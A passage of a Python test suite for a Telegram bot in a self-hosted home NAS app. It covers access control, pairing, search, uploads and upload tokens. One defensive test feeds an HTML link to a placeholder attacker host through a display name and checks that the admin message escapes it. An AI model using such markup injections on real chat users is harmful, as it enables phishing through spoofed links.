"""
Tests for telegram_bot.py.

Strategy: no real Telegram connection is needed. Tests cover:
- _is_allowed() access control logic (async, KV-store-backed)
- start_bot() and stop_bot() lifecycle (no token / no library)
- /auth auto-link flow
- Handler routing using lightweight mock Update objects
- list_recent_documents via document_index integration
"""

import asyncio
import pytest
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

from app.config import settings


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_update(text: str = "", chat_id: int = 12345, first_name: str = "Test") -> MagicMock:
    """Build a minimal mock telegram Update."""
    update = MagicMock()
    update.effective_chat.id = chat_id
    update.effective_user.first_name = first_name
    update.effective_user.username = first_name.lower()
    update.message.text = text
    update.message.caption = None
    update.message.document = None
    update.message.video = None
    update.message.audio = None
    update.message.photo = None
    update.message.reply_text = AsyncMock()
    update.message.reply_document = AsyncMock()
    return update


def _make_context() -> MagicMock:
    ctx = MagicMock()
    ctx.bot.send_chat_action = AsyncMock()
    ctx.bot.send_message = AsyncMock()
    ctx.bot.get_file = AsyncMock()
    return ctx


# ---------------------------------------------------------------------------
# _is_allowed — async, store-backed
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_is_allowed_no_linked_ids():
    """Empty linked_ids means nobody is allowed."""
    with patch("app.store.get_value", new=AsyncMock(return_value=[])):
        from app.telegram_bot import _is_allowed
        assert await _is_allowed(12345) is False


@pytest.mark.asyncio
async def test_is_allowed_with_linked_id():
    with patch("app.store.get_value", new=AsyncMock(return_value=[12345, 67890])):
        from app.telegram_bot import _is_allowed
        assert await _is_allowed(12345) is True
        assert await _is_allowed(67890) is True


@pytest.mark.asyncio
async def test_is_allowed_rejects_unlinked():
    with patch("app.store.get_value", new=AsyncMock(return_value=[12345])):
        from app.telegram_bot import _is_allowed
        assert await _is_allowed(99999) is False


# ---------------------------------------------------------------------------
# /auth handler
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_handle_auth_links_new_user():
    """First /auth from unlinked user → queues pending approval request."""
    import app.telegram_bot as tb
    with patch("app.telegram_bot._is_allowed", new=AsyncMock(return_value=False)), \
         patch("app.telegram_bot._add_pending_approval", new=AsyncMock()) as mock_pending, \
         patch("app.telegram_bot._get_admin_chat_ids", new=AsyncMock(return_value=set())):
        update = _make_update(chat_id=42, first_name="Alice")
        await tb._handle_auth(update, _make_context())
    mock_pending.assert_called_once_with(42, "alice", "Alice")
    msg = update.message.reply_text.call_args[0][0]
    assert "request" in msg.lower() or "pending" in msg.lower() or "admin" in msg.lower()


@pytest.mark.asyncio
async def test_handle_auth_admin_request_escapes_untrusted_profile_fields():
    """M-3: first_name/username/requested_owner are fully attacker-controlled Telegram
    profile fields — the admin-facing pairing-request message must HTML-escape them, not
    interpolate raw. Without this a crafted <a href=...> in a display name renders as a real
    link in the admin's own chat."""
    import app.telegram_bot as tb
    mock_app = MagicMock()
    mock_app.bot.send_message = AsyncMock()
    tb._application = mock_app
    try:
        with patch("app.telegram_bot._is_allowed", new=AsyncMock(return_value=False)), \
             patch("app.telegram_bot._add_pending_approval", new=AsyncMock()), \
             patch("app.telegram_bot._get_admin_chat_ids", new=AsyncMock(return_value={999})):
            update = _make_update(
                chat_id=42,
                text="/auth <a href=\"http://evil.example/\">folder</a>",
                first_name="<a href=\"http://evil.example/\">Alice</a>",
            )
            await tb._handle_auth(update, _make_context())
    finally:
        tb._application = None

    sent_text = mock_app.bot.send_message.call_args.kwargs["text"]
    assert "<a href" not in sent_text
    assert "&lt;a href" in sent_text


@pytest.mark.asyncio
async def test_handle_auth_already_linked():
    """Second /auth from same user → already linked message."""
    import app.telegram_bot as tb
    with patch("app.telegram_bot._is_allowed", new=AsyncMock(return_value=True)):
        update = _make_update(chat_id=42, first_name="Alice")
        await tb._handle_auth(update, _make_context())
    msg = update.message.reply_text.call_args[0][0]
    assert "already" in msg.lower()


# ---------------------------------------------------------------------------
# Lifecycle: start_bot / stop_bot
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_start_bot_skips_when_no_token():
    """start_bot() returns immediately when the token is empty."""
    settings.telegram_bot_token = ""
    import app.telegram_bot as tb
    tb._application = None
    await tb.start_bot()
    assert tb._application is None


@pytest.mark.asyncio
async def test_start_bot_skips_when_library_missing():
    """start_bot() logs a warning and returns when python-telegram-bot is not installed."""
    settings.telegram_bot_token = "fake-token"
    import app.telegram_bot as tb
    tb._application = None
    with patch.dict("sys.modules", {"telegram": None, "telegram.ext": None}):
        # Force ImportError on 'from telegram.ext import ...'
        import builtins
        real_import = builtins.__import__

        def mock_import(name, *args, **kwargs):
            if name.startswith("telegram"):
                raise ImportError("mocked missing")
            return real_import(name, *args, **kwargs)

        with patch("builtins.__import__", side_effect=mock_import):
            await tb.start_bot()
    assert tb._application is None


@pytest.mark.asyncio
async def test_stop_bot_no_app_is_noop():
    """stop_bot() with no running application does nothing and does not raise."""
    import app.telegram_bot as tb
    tb._application = None
    await tb.stop_bot()  # must not raise
    assert tb._application is None


@pytest.mark.asyncio
async def test_stop_bot_calls_shutdown():
    """stop_bot() calls updater.stop(), stop(), shutdown() on the application."""
    import app.telegram_bot as tb
    mock_app = MagicMock()
    mock_app.updater.stop = AsyncMock()
    mock_app.stop = AsyncMock()
    mock_app.shutdown = AsyncMock()
    tb._application = mock_app

    await tb.stop_bot()

    mock_app.updater.stop.assert_called_once()
    mock_app.stop.assert_called_once()
    mock_app.shutdown.assert_called_once()
    assert tb._application is None


@pytest.mark.asyncio
async def test_stop_bot_timeout_does_not_hang():
    """stop_bot() returns even if updater.stop() hangs for too long."""
    import app.telegram_bot as tb

    async def _slow_stop():
        await asyncio.sleep(10)

    mock_app = MagicMock()
    mock_app.updater.stop = _slow_stop
    mock_app.stop = AsyncMock()
    mock_app.shutdown = AsyncMock()
    tb._application = mock_app

    await asyncio.wait_for(tb.stop_bot(), timeout=6.5)

    mock_app.stop.assert_called_once()
    mock_app.shutdown.assert_called_once()
    assert tb._application is None


# ---------------------------------------------------------------------------
# /start handler
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_handle_start_unauthorized():
    """/start from an unlinked chat ID → prompt to /auth."""
    from app.telegram_bot import _handle_start
    with patch("app.telegram_bot._is_allowed", new=AsyncMock(return_value=False)):
        update = _make_update(chat_id=12345)
        await _handle_start(update, _make_context())
    call_args = update.message.reply_text.call_args[0][0]
    assert "/auth" in call_args


@pytest.mark.asyncio
async def test_handle_start_authorized():
    """/start from linked chat ID → welcome back message."""
    from app.telegram_bot import _handle_start
    with patch("app.telegram_bot._is_allowed", new=AsyncMock(return_value=True)):
        update = _make_update(chat_id=12345)
        await _handle_start(update, _make_context())
    call_args = update.message.reply_text.call_args[0][0]
    assert "Welcome" in call_args or "welcome" in call_args.lower()


# ---------------------------------------------------------------------------
# /list handler
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_handle_list_no_docs():
    """/list when index is empty → friendly 'no docs' message."""
    from app.telegram_bot import _handle_list
    with patch("app.telegram_bot._is_allowed", new=AsyncMock(return_value=True)), \
         patch("app.document_index.list_recent_documents", new=AsyncMock(return_value=[])):
        update = _make_update(chat_id=12345)
        await _handle_list(update, _make_context())
    call_args = update.message.reply_text.call_args[0][0]
    assert "no" in call_args.lower() or "empty" in call_args.lower() or "yet" in call_args.lower()


@pytest.mark.asyncio
async def test_handle_list_with_docs_stores_results():
    """/list with docs → numbered list sent; _last_results populated for chat."""
    import app.telegram_bot as tb
    tb._last_results.clear()
    docs = [
        {"path": "/personal/alice/Documents/a.txt", "filename": "a.txt", "added_by": "alice", "added_at": "2026-01-01T00:00:00"},
        {"path": "/personal/alice/Documents/b.pdf", "filename": "b.pdf", "added_by": "alice", "added_at": "2026-01-02T00:00:00"},
    ]
    with patch("app.telegram_bot._is_allowed", new=AsyncMock(return_value=True)), \
         patch("app.document_index.list_recent_documents", new=AsyncMock(return_value=docs)):
        update = _make_update(chat_id=42)
        await tb._handle_list(update, _make_context())

    assert 42 in tb._last_results
    assert len(tb._last_results[42]) == 2
    msg = update.message.reply_text.call_args[0][0]
    assert "1." in msg
    assert "2." in msg


# ---------------------------------------------------------------------------
# Message handler — search
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_handle_message_search_no_results():
    """Search with no results → 'no documents found' message."""
    import app.telegram_bot as tb
    tb._last_results.clear()
    with patch("app.telegram_bot._is_allowed", new=AsyncMock(return_value=True)), \
         patch("app.document_index.search_documents", new=AsyncMock(return_value=[])):
        update = _make_update(text="zzznomatch", chat_id=42)
        await tb._handle_message(update, _make_context())
    msg = update.message.reply_text.call_args[0][0]
    assert "zzznomatch" in msg


@pytest.mark.asyncio
async def test_handle_message_search_single_result_shows_list(tmp_path):
    """Search returning 1 result → numbered list shown (user replies '1' to get file)."""
    import app.telegram_bot as tb
    tb._last_results.clear()
    result = [{"path": "/personal/alice/Documents/invoice.pdf", "filename": "invoice.pdf", "added_by": "alice"}]
    with patch("app.telegram_bot._is_allowed", new=AsyncMock(return_value=True)), \
         patch("app.document_index.search_documents", new=AsyncMock(return_value=result)):
        update = _make_update(text="invoice", chat_id=42)
        await tb._handle_message(update, _make_context())

    # Should show a numbered list, not send the file directly
    update.message.reply_document.assert_not_called()
    msg = update.message.reply_text.call_args[0][0]
    assert "1." in msg
    assert "invoice.pdf" in msg


@pytest.mark.asyncio
async def test_handle_message_search_multiple_results():
    """Search returning 2+ results → numbered list sent."""
    import app.telegram_bot as tb
    tb._last_results.clear()
    results = [
        {"path": "/personal/alice/Documents/a.txt", "filename": "a.txt", "added_by": "alice"},
        {"path": "/personal/alice/Documents/b.txt", "filename": "b.txt", "added_by": "alice"},
    ]
    with patch("app.telegram_bot._is_allowed", new=AsyncMock(return_value=True)), \
         patch("app.document_index.search_documents", new=AsyncMock(return_value=results)):
        update = _make_update(text="something", chat_id=42)
        await tb._handle_message(update, _make_context())

    assert len(tb._last_results.get(42, [])) == 2
    msg = update.message.reply_text.call_args[0][0]
    assert "1." in msg and "2." in msg


# ---------------------------------------------------------------------------
# Message handler — number reply
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_handle_message_number_sends_file(tmp_path):
    """Numeric reply sends the nth file from the last search."""
    nas = tmp_path / "nas"
    doc_dir = nas / "personal" / "alice" / "Documents"
    doc_dir.mkdir(parents=True)
    doc = doc_dir / "notes.txt"
    doc.write_text("hello")
    settings.nas_root = nas

    import app.telegram_bot as tb
    tb._last_results[55] = [
        {"path": "/personal/alice/Documents/notes.txt", "filename": "notes.txt", "added_by": "alice"},
    ]
    with patch("app.telegram_bot._is_allowed", new=AsyncMock(return_value=True)):
        update = _make_update(text="1", chat_id=55)
        await tb._handle_message(update, _make_context())
    update.message.reply_document.assert_called_once()


@pytest.mark.asyncio
async def test_handle_message_invalid_number():
    """Out-of-range number reply → error message, no file sent."""
    import app.telegram_bot as tb
    tb._last_results[55] = [
        {"path": "/personal/alice/Documents/a.txt", "filename": "a.txt", "added_by": "alice"},
    ]
    with patch("app.telegram_bot._is_allowed", new=AsyncMock(return_value=True)):
        update = _make_update(text="5", chat_id=55)  # only 1 result stored
        await tb._handle_message(update, _make_context())
    update.message.reply_document.assert_not_called()
    msg = update.message.reply_text.call_args[0][0]
    assert "invalid" in msg.lower() or "number" in msg.lower()


@pytest.mark.asyncio
async def test_handle_message_number_with_no_prior_search():
    """Numeric reply when no prior search → error message."""
    import app.telegram_bot as tb
    tb._last_results.pop(77, None)
    with patch("app.telegram_bot._is_allowed", new=AsyncMock(return_value=True)):
        update = _make_update(text="1", chat_id=77)
        await tb._handle_message(update, _make_context())
    update.message.reply_document.assert_not_called()
    msg = update.message.reply_text.call_args[0][0]
    assert "invalid" in msg.lower() or "search" in msg.lower()


# ---------------------------------------------------------------------------
# _send_file edge case
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_send_file_missing_path_sends_error(tmp_path):
    """_send_file with a non-existent path sends an error message, not a file."""
    settings.nas_root = tmp_path / "nas"
    (settings.nas_root / "personal" / "alice" / "Documents").mkdir(parents=True)
    import app.telegram_bot as tb
    update = _make_update(chat_id=1)
    doc = {"path": "/personal/alice/Documents/ghost.pdf", "filename": "ghost.pdf"}
    with patch("app.document_index.remove_document", new=AsyncMock()) as mock_remove:
        await tb._send_file(update, doc)
    mock_remove.assert_called_once_with("/personal/alice/Documents/ghost.pdf")
    update.message.reply_document.assert_not_called()
    msg = update.message.reply_text.call_args[0][0]
    assert "not found" in msg.lower() or "ghost" in msg.lower()


@pytest.mark.asyncio
async def test_handle_media_message_prompts_for_destination():
    import app.telegram_bot as tb
    tb._pending_uploads.clear()

    update = _make_update(chat_id=88)
    update.message.document = MagicMock()
    update.message.document.file_id = "doc-1"
    update.message.document.file_name = "passport.pdf"

    with patch("app.telegram_bot._is_allowed", new=AsyncMock(return_value=True)):
        await tb._handle_media_message(update, _make_context())

    assert 88 in tb._pending_uploads
    prompt = update.message.reply_text.call_args[0][0]
    assert "Where would you like to save" in prompt or "save" in prompt.lower()


@pytest.mark.asyncio
async def test_handle_media_message_oversized_file_prompts_destination():
    """Oversized file is stored as pending and shows the normal destination prompt (no size warning)."""
    import app.telegram_bot as tb
    tb._pending_uploads.clear()

    update = _make_update(chat_id=188)
    update.message.video = MagicMock()
    update.message.video.file_id = "vid-big"
    update.message.video.file_name = "movie.mp4"
    update.message.video.file_size = 30 * 1024 * 1024  # 30 MB

    with patch("app.telegram_bot._is_allowed", new=AsyncMock(return_value=True)):
        await tb._handle_media_message(update, _make_context())

    # Should still be stored as pending (user picks destination next)
    assert 188 in tb._pending_uploads
    msg = update.message.reply_text.call_args[0][0]
    # No size-warning text, just the destination prompt
    assert "too large" not in msg.lower()
    assert "upload link" not in msg.lower()
    assert "save" in msg.lower()


@pytest.mark.asyncio
async def test_handle_pending_upload_choice_private_completes(tmp_path, monkeypatch):
    """L-6 (security audit 2026-08): this test used to fail in isolation (pass only when an
    earlier client-fixture test in the same run happened to leave settings.data_dir/store._cache
    in a state that masked it) -- _process_upload_choice's unmocked _record_recent_file() writes
    through settings.data_dir, which defaults to the real /var/lib/aihomecloud. Every other test
    in this suite gets that monkeypatched by the client fixture; this one never used it."""
    from app.config import settings
    from app import store
    monkeypatch.setattr(settings, "data_dir", tmp_path)
    store._cache.clear()

    import app.telegram_bot as tb
    tb._pending_uploads.clear()
    pending = tb.PendingUpload(
        file_id="doc-2",
        filename="license.pdf",
        kind="document",
    )
    tb._pending_uploads[99] = pending

    update = _make_update(text="1", chat_id=99, first_name="Alice")
    context = _make_context()
    status_msg = MagicMock()
    status_msg.edit_text = AsyncMock()
    context.bot.send_message = AsyncMock(return_value=status_msg)

    saved = tmp_path / "nas" / "personal" / "alice" / "Documents" / "license.pdf"
    saved.parent.mkdir(parents=True, exist_ok=True)
    saved.write_text("ok")

    with patch("app.telegram_bot._resolve_personal_owner", new=AsyncMock(return_value="alice")), \
         patch("app.telegram_bot._store_private_or_shared_file", new=AsyncMock(return_value=saved)):
        await tb._process_upload_choice(update, context, 99, "1", pending)

    assert 99 not in tb._pending_uploads
    msg_text = status_msg.edit_text.call_args.args[0]
    assert "Saved" in msg_text


@pytest.mark.asyncio
async def test_handle_pending_upload_choice_entertainment_completes(tmp_path, monkeypatch):
    """L-6: same root cause as test_handle_pending_upload_choice_private_completes above --
    see that test's docstring."""
    from app.config import settings
    from app import store
    monkeypatch.setattr(settings, "data_dir", tmp_path)
    store._cache.clear()

    import app.telegram_bot as tb
    tb._pending_uploads.clear()
    pending = tb.PendingUpload(
        file_id="vid-1",
        filename="fun.mp4",
        kind="video",
    )
    tb._pending_uploads[100] = pending

    update = _make_update(text="3", chat_id=100, first_name="Alice")
    context = _make_context()
    status_msg = MagicMock()
    status_msg.edit_text = AsyncMock()
    context.bot.send_message = AsyncMock(return_value=status_msg)

    saved = tmp_path / "nas" / "shared" / "Entertainment" / "fun.mp4"
    saved.parent.mkdir(parents=True, exist_ok=True)
    saved.write_text("ok")

    with patch("app.telegram_bot._resolve_personal_owner", new=AsyncMock(return_value="alice")), \
         patch("app.telegram_bot._store_entertainment_file", new=AsyncMock(return_value=saved)):
        await tb._process_upload_choice(update, context, 100, "3", pending)

    assert 100 not in tb._pending_uploads
    msg_text = status_msg.edit_text.call_args.args[0]
    assert "Saved" in msg_text
    assert "Entertainment" in msg_text


@pytest.mark.asyncio
async def test_handle_pending_upload_choice_too_big_shows_specific_error():
    """When the bot API raises 'file is too big' at download time, a clear message is shown."""
    import app.telegram_bot as tb
    tb._pending_uploads.clear()
    pending = tb.PendingUpload(
        file_id="vid-big",
        filename="huge.mp4",
        kind="video",
        file_size=1000,  # small enough to skip progress task
    )
    tb._pending_uploads[101] = pending

    update = _make_update(text="3", chat_id=101, first_name="Alice")
    context = _make_context()
    status_msg = MagicMock()
    status_msg.edit_text = AsyncMock()
    context.bot.send_message = AsyncMock(return_value=status_msg)

    with patch("app.telegram_bot._resolve_personal_owner", new=AsyncMock(return_value="alice")), \
         patch("app.telegram_bot._store_entertainment_file", new=AsyncMock(side_effect=RuntimeError("File is too big"))):
        await tb._process_upload_choice(update, context, 101, "3", pending)

    # Keep pending upload so user can retry with another option/file.
    assert 101 in tb._pending_uploads
    msg_text = status_msg.edit_text.call_args.args[0]
    assert "too large" in msg_text.lower()
    assert "telegram" in msg_text.lower()


@pytest.mark.asyncio
async def test_handle_pending_upload_choice_oversized_tells_user_to_enable_large_file_mode():
    """When Telegram API rejects a large file, user is told to enable Large File mode."""
    import app.telegram_bot as tb
    tb._pending_uploads.clear()
    pending = tb.PendingUpload(
        file_id="vid-huge",
        filename="big_movie.mp4",
        kind="video",
        file_size=500 * 1024 * 1024,
    )
    tb._pending_uploads[200] = pending

    update = _make_update(text="3", chat_id=200, first_name="Alice")
    context = _make_context()
    status_msg = MagicMock()
    status_msg.edit_text = AsyncMock()
    context.bot.send_message = AsyncMock(return_value=status_msg)

    with patch("app.telegram_bot._resolve_personal_owner", new=AsyncMock(return_value="alice")), \
         patch("app.telegram_bot._store_entertainment_file",
               new=AsyncMock(side_effect=RuntimeError("File is too big"))):
        await tb._process_upload_choice(update, context, 200, "3", pending)

    assert 200 in tb._pending_uploads  # kept so user can retry
    msg_text = status_msg.edit_text.call_args.args[0]
    assert "large file mode" in msg_text.lower()
    assert "upload link" not in msg_text.lower()
    assert "phone" not in msg_text.lower()


@pytest.mark.asyncio
async def test_handle_pending_upload_choice_insufficient_disk_space_shows_specific_error():
    """When the pre-flight disk-space check rejects a download, a clear message with the
    actual needed/free byte counts is shown, distinct from the generic failure message."""
    import app.telegram_bot as tb
    tb._pending_uploads.clear()
    pending = tb.PendingUpload(
        file_id="vid-nospace",
        filename="movie.mp4",
        kind="video",
        file_size=1000,  # small enough to skip progress task
    )
    tb._pending_uploads[201] = pending

    update = _make_update(text="3", chat_id=201, first_name="Alice")
    context = _make_context()
    status_msg = MagicMock()
    status_msg.edit_text = AsyncMock()
    context.bot.send_message = AsyncMock(return_value=status_msg)

    space_error = tb.InsufficientDiskSpaceError(needed=2 * 1024**3, free=100 * 1024**2)
    with patch("app.telegram_bot._resolve_personal_owner", new=AsyncMock(return_value="alice")), \
         patch("app.telegram_bot._store_entertainment_file", new=AsyncMock(side_effect=space_error)):
        await tb._process_upload_choice(update, context, 201, "3", pending)

    assert 201 in tb._pending_uploads  # kept so user can retry after freeing space
    msg_text = status_msg.edit_text.call_args.args[0]
    assert "not enough storage" in msg_text.lower()
    assert "2.00 GB" in msg_text
    assert "100.0 MB" in msg_text


@pytest.mark.asyncio
async def test_store_private_file_does_not_overwrite_pending_inbox_file(client):
    """A second same-named Telegram direct-chat upload landing in .inbox before the sort
    worker picks up the first must not silently overwrite it -- same bug class as
    telegram_upload_routes.py's _sort_uploaded_file (fixed 2026-07-15), found in this
    sibling direct-chat-upload path while hardening the download pipeline for movies."""
    import app.telegram_bot as tb
    from app.ingest import Scope

    base_dir = settings.nas_root / "personal" / "alice"
    inbox = base_dir / ".inbox"
    inbox.mkdir(parents=True)
    (inbox / "movie.mp4").write_bytes(b"first upload bytes")

    pending = tb.PendingUpload(file_id="vid-collide", filename="movie.mp4", kind="video")

    telegram_file = MagicMock()

    async def _write(custom_path):
        Path(custom_path).write_bytes(b"second upload bytes")

    telegram_file.download_to_drive = AsyncMock(side_effect=_write)
    telegram_file.file_size = len(b"second upload bytes")
    bot = MagicMock()
    bot.get_file = AsyncMock(return_value=telegram_file)

    dest = await tb._store_private_or_shared_file(bot, pending, base_dir, "alice", Scope.PERSONAL)

    # The first upload's bytes must survive untouched under its original name.
    assert (inbox / "movie.mp4").read_bytes() == b"first upload bytes"
    # The second upload was sorted out under a uniquified name, not overwriting the first.
    assert dest.read_bytes() == b"second upload bytes"
    assert dest != inbox / "movie.mp4"


# ---------------------------------------------------------------------------
# list_recent_documents (document_index integration)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_list_recent_documents_empty(tmp_path):
    """list_recent_documents returns [] when index is empty."""
    settings.data_dir = tmp_path
    from app.document_index import init_db, list_recent_documents
    await init_db()
    docs = await list_recent_documents(limit=10)
    assert docs == []


@pytest.mark.asyncio
async def test_list_recent_documents_returns_newest_first(tmp_path):
    """list_recent_documents returns docs sorted newest first."""
    settings.data_dir = tmp_path
    nas = tmp_path / "nas"
    (nas / "personal" / "alice" / "Documents").mkdir(parents=True)
    settings.nas_root = nas

    from app.document_index import init_db, index_document, list_recent_documents
    await init_db()

    doc_a = nas / "personal" / "alice" / "Documents" / "old.txt"
    doc_b = nas / "personal" / "alice" / "Documents" / "new.txt"
    doc_a.write_text("older document")
    doc_b.write_text("newer document")

    await index_document(str(doc_a), doc_a.name, "alice")
    # Small sleep to ensure different added_at timestamps
    await asyncio.sleep(0.01)
    await index_document(str(doc_b), doc_b.name, "alice")

    # Identity is required now. Called without one, the listing is scoped to shared documents —
    # it used to return everything, which is how the Telegram bot exposed every member's files.
    docs = await list_recent_documents(limit=10, user_role="member", username="alice")
    assert len(docs) == 2
    assert docs[0]["filename"] == "new.txt"
    assert docs[1]["filename"] == "old.txt"


async def test_list_recent_documents_does_not_cross_members(tmp_path):
    """
    The finding this scoping exists for: /list returned the newest documents belonging to every
    member, and the bot then offers "reply with a number" to download one. Bob must never see
    Alice's documents, and a caller that supplies no identity must get less, not everything.
    """
    settings.data_dir = tmp_path
    nas = tmp_path / "nas"
    (nas / "personal" / "alice" / "Documents").mkdir(parents=True)
    (nas / "personal" / "bob" / "Documents").mkdir(parents=True)
    settings.nas_root = nas

    from app.document_index import init_db, index_document, list_recent_documents
    await init_db()

    a = nas / "personal" / "alice" / "Documents" / "alice-passport.txt"
    b = nas / "personal" / "bob" / "Documents" / "bob-notes.txt"
    a.write_text("alice private")
    b.write_text("bob private")
    await index_document(str(a), a.name, "alice")
    await index_document(str(b), b.name, "bob")

    bob_sees = {d["filename"] for d in
                await list_recent_documents(limit=10, user_role="member", username="bob")}
    assert "alice-passport.txt" not in bob_sees, "cross-member document disclosure"
    assert "bob-notes.txt" in bob_sees

    anonymous = await list_recent_documents(limit=10)
    assert anonymous == [], "an unidentified caller must not receive personal documents"

    admin_sees = {d["filename"] for d in
                  await list_recent_documents(limit=10, user_role="admin")}
    assert {"alice-passport.txt", "bob-notes.txt"} <= admin_sees


# ---------------------------------------------------------------------------
# Upload route — token management
# ---------------------------------------------------------------------------

def test_upload_token_create_and_pop():
    """create_upload_token returns a token; pop_upload_token consumes it."""
    from app.routes.telegram_upload_routes import (
        create_upload_token, pop_upload_token, _upload_tokens,
    )
    _upload_tokens.clear()

    token = create_upload_token(
        chat_id=42, destination="entertainment", owner="alice", filename="movie.mp4",
    )
    assert isinstance(token, str) and len(token) > 10
    assert token in _upload_tokens

    ut = pop_upload_token(token)
    assert ut is not None
    assert ut.chat_id == 42
    assert ut.destination == "entertainment"
    assert ut.filename == "movie.mp4"

    # Second pop → None (single-use)
    assert pop_upload_token(token) is None


def test_upload_token_expired():
    """Expired tokens are rejected by pop_upload_token."""
    import time
    from app.routes.telegram_upload_routes import (
        create_upload_token, pop_upload_token, _upload_tokens, _TOKEN_TTL_SECONDS,
    )
    _upload_tokens.clear()

    token = create_upload_token(
        chat_id=42, destination="private", owner="alice", filename="old.pdf",
    )
    # Force expiry
    _upload_tokens[token].created_at = time.monotonic() - _TOKEN_TTL_SECONDS - 10

    assert pop_upload_token(token) is None


# ---------------------------------------------------------------------------
# Upload route — HTTP endpoints
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_upload_form_valid_token(client):
    """GET /api/telegram-upload/{token} returns HTML form for valid tokens."""
    from app.routes.telegram_upload_routes import create_upload_token, _upload_tokens
    _upload_tokens.clear()

    token = create_upload_token(
        chat_id=42, destination="entertainment", owner="alice", filename="video.mp4",
    )
    resp = await client.get(f"/api/telegram-upload/{token}")
    assert resp.status_code == 200
    assert "text/html" in resp.headers["content-type"]
    assert "video.mp4" in resp.text
    assert "Entertainment" in resp.text


@pytest.mark.asyncio
async def test_upload_form_expired_token(client):
    """GET /api/telegram-upload/{token} returns 410 for expired tokens."""
    resp = await client.get("/api/telegram-upload/nonexistent-token")
    assert resp.status_code == 410


@pytest.mark.asyncio
async def test_upload_post_stores_entertainment_file(client, tmp_path):
    """POST /api/telegram-upload/{token} stores file in Entertainment folder."""
    from app.routes.telegram_upload_routes import create_upload_token, _upload_tokens
    _upload_tokens.clear()

    token = create_upload_token(
        chat_id=42, destination="entertainment", owner="alice", filename="video.mp4",
    )

    with patch("app.routes.telegram_upload_routes._notify_telegram", new=AsyncMock()):
        resp = await client.post(
            f"/api/telegram-upload/{token}",
            files={"file": ("my_video.mp4", b"fake video data", "video/mp4")},
        )

    assert resp.status_code == 200
    body = resp.json()
    assert "entertainment" in body["message"].lower()
    assert "my_video.mp4" in body["message"]


@pytest.mark.asyncio
async def test_upload_post_token_consumed(client, tmp_path):
    """POST upload consumes token; second POST returns 410."""
    from app.routes.telegram_upload_routes import create_upload_token, _upload_tokens
    _upload_tokens.clear()

    token = create_upload_token(
        chat_id=42, destination="entertainment", owner="alice", filename="clip.mp4",
    )

    with patch("app.routes.telegram_upload_routes._notify_telegram", new=AsyncMock()):
        resp = await client.post(
            f"/api/telegram-upload/{token}",
            files={"file": ("clip.mp4", b"data", "video/mp4")},
        )
    assert resp.status_code == 200

    # Second attempt → 410
    resp2 = await client.post(
        f"/api/telegram-upload/{token}",
        files={"file": ("clip.mp4", b"data", "video/mp4")},
    )
    assert resp2.status_code == 410


@pytest.mark.asyncio
async def test_upload_post_private_sorts_file(client, tmp_path):
    """POST upload to private destination sorts through inbox/file_sorter."""
    from app.routes.telegram_upload_routes import create_upload_token, _upload_tokens
    from app.config import settings
    _upload_tokens.clear()

    token = create_upload_token(
        chat_id=42, destination="private", owner="alice", filename="doc.pdf",
    )

    saved_path = settings.personal_path / "alice" / "Documents" / "doc.pdf"
    saved_path.parent.mkdir(parents=True, exist_ok=True)
    saved_path.write_bytes(b"test")

    with patch("app.routes.telegram_upload_routes._notify_telegram", new=AsyncMock()), \
         patch("app.routes.telegram_upload_routes._sort_uploaded_file", new=AsyncMock(return_value=saved_path)):
        resp = await client.post(
            f"/api/telegram-upload/{token}",
            files={"file": ("doc.pdf", b"fake doc data", "application/pdf")},
        )

    assert resp.status_code == 200
    body = resp.json()
    assert "private" in body["message"].lower()
    assert "doc.pdf" in body["message"]


# ===========================================================================
# setup-local-api endpoint tests (source build flow)
# ===========================================================================

class TestSetupLocalApi:
    """Tests for POST /api/v1/telegram/setup-local-api."""

    @pytest.fixture
    async def auth_headers(self, client):
        """Create admin and return auth headers."""
        await client.post("/api/v1/users", json={"name": "admin", "pin": "0000"})
        resp = await client.post("/api/v1/auth/login", json={"name": "admin", "pin": "0000"})
        token = resp.json()["accessToken"]
        return {"Authorization": f"Bearer {token}"}

    async def test_rejects_bad_api_id(self, client, auth_headers):
        resp = await client.post(
            "/api/v1/telegram/setup-local-api",
            json={"api_id": 0, "api_hash": "abcdef1234567890"},
            headers=auth_headers,
        )
        assert resp.status_code == 422

    async def test_rejects_bad_api_hash(self, client, auth_headers):
        resp = await client.post(
            "/api/v1/telegram/setup-local-api",
            json={"api_id": 12345, "api_hash": "not-hex!"},
            headers=auth_headers,
        )
        assert resp.status_code == 422

    async def test_rejects_unauthenticated(self, client):
        resp = await client.post(
            "/api/v1/telegram/setup-local-api",
            json={"api_id": 12345, "api_hash": "abcdef1234567890"},
        )
        assert resp.status_code in (401, 403)

    async def test_returns_job_id(self, client, auth_headers):
        """Successful call returns 202 with a job_id."""
        with patch("app.routes.telegram_routes._run_local_api_setup", new=AsyncMock()):
            resp = await client.post(
                "/api/v1/telegram/setup-local-api",
                json={"api_id": 12345, "api_hash": "abcdef1234567890"},
                headers=auth_headers,
            )
        assert resp.status_code == 202
        body = resp.json()
        assert "job_id" in body
        assert isinstance(body["job_id"], str)

    async def test_persists_credentials(self, client, auth_headers, tmp_path):
        """Credentials are saved to store even if background job is mocked out."""
        from app import store as _store
        with patch("app.routes.telegram_routes._run_local_api_setup", new=AsyncMock()):
            await client.post(
                "/api/v1/telegram/setup-local-api",
                json={"api_id": 99999, "api_hash": "aabbccdd11223344"},
                headers=auth_headers,
            )
        saved = await _store.get_value("telegram_config", default={})
        assert saved.get("api_id") == 99999
        assert saved.get("api_hash") == "aabbccdd11223344"

    async def test_setup_skips_build_when_service_active(self, client, auth_headers):
        """When service is already active, skip build and jump to activation."""
        from app.job_store import get_job

        calls = []

        async def fake_run_command(cmd, timeout=30):
            cmd_str = " ".join(str(c) for c in cmd)
            calls.append(cmd_str)
            if "systemctl is-active" in cmd_str:
                return (0, "active\n", "")
            return (0, "", "")

        with patch("app.routes.telegram_routes.run_command", side_effect=fake_run_command), \
